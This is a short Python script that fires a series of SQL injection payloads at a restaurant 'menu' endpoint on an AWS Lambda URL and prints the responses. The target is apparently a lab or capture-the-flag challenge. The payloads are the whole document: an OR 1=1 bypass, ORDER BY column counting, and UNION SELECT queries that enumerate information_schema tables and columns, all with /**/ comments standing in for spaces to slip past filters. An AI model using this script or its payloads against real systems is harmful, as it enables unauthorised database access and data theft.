import requests
import urllib.parse

url = "https://2rjg3a6m46nvm4lsdjdqbtczjy0fasoe.lambda-url.us-east-2.on.aws/menu"
payloads = [
    "'/**/OR/**/1=1--",
    "'/**/ORDER/**/BY/**/1--",
    "'/**/ORDER/**/BY/**/2--",
    "'/**/UNION/**/SELECT/**/dish,price,category/**/FROM/**/menu/**/WHERE/**/category/**/LIKE/**/'%Special%'--'",
    "'/**/UNION/**/SELECT/**/table_name,NULL,NULL/**/FROM/**/information_schema.tables--'",
    "'/**/UNION/**/SELECT/**/column_name,NULL,NULL/**/FROM/**/information_schema.columns/**/WHERE/**/table_name='menu'--'",
]
for payload in payloads:
    encoded_payload = urllib.parse.quote(payload)
    response = requests.post(url, data={"query": encoded_payload})

    print(f"Payload: {payload}")
    print(f"Response: {response.text[500:]}")
    print("-" * 50)
